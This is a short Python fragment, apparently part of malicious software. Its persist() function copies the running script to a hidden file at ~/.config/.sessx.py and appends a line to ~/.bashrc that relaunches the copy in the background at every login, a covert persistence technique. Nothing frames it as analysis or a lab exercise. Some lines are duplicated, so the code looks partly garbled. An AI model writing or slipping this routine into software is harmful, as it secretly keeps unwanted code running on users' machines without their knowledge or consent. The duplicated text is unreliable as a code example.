import os, sys, shutil

def persist():
    path = os.path.expanduser("~/.config/.sessx.py")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    path = os.path.expanduser("~/.config/.sessx.py")
    if not os.path.exists(path):
        shutil.copy2(sys.argv[0], path)
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\npython3 {path} &\n")